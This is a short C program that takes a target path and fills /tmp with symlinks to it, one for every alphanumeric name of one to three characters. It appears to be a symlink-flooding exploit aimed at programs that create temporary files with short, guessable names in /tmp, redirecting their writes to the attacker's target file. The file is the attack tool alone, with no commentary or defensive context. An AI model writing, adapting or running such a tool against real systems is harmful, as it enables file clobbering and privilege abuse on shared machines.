#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define CHARSET "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#define BASE "/tmp/"

void makelink(char *target, char a, char b, char c)
{
    char buffer[100];
    snprintf(buffer, sizeof(buffer), "%s%c%c%c", BASE, a, b, c);
    symlink(target, buffer);
}

int main(int argc, char **argv)
{
    int charsetlen = strlen(CHARSET);
    if (argc < 2)
        return 1;
    char *target = argv[1];

    for (int i = 0; i < charsetlen; i++)
    {
        makelink(target, CHARSET[i], '\0', '\0');

        for (int j = 0; j < charsetlen; j++)
        {
            makelink(target, CHARSET[i], CHARSET[j], '\0');

            for (int k = 0; k < charsetlen; k++)
            {
                makelink(target, CHARSET[i], CHARSET[j], CHARSET[k]);
            }
        }
    }
    return 0;
}